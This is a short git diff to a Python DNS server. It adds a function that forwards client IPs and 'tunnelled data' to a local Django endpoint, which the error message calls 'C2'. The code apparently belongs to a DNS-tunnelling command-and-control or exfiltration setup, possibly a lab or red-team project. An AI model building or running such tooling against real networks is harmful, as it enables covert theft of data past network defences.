@@ -2,6 +2,7 @@ from dnslib import DNSRecord, QTYPE,  RR, A, DNSHeader
 import socket
 import socketserver
 import base64
+import requests
 
 hostname = socket.gethostname()
 local_ip = socket.gethostbyname(hostname)
@@ -9,6 +10,19 @@ local_ip = socket.gethostbyname(hostname)
 DOMAIN_TO_IP = {
     'southpark.com': '218.145.223.76'
 }
+
+DJANGO_SERVER = "http://127.0.0.1:8000"
+
+def send_to_db(ip, resp_data):
+    url = f"{DJANGO_SERVER}/dns_tun"
+    data = {
+        "ip":ip,
+        "data":resp_data
+    }
+    try:
+        r = requests.post(url=url, data=data)
+    except Exception as e:
+        print(f"Exception occured while sending tunnelled data to C2 ->{e}")
 
 # HANDLER instatiated by DNSServer class in the library to handle requests.
 # In most cases you dont need to change DNSHandler unless you need to get 
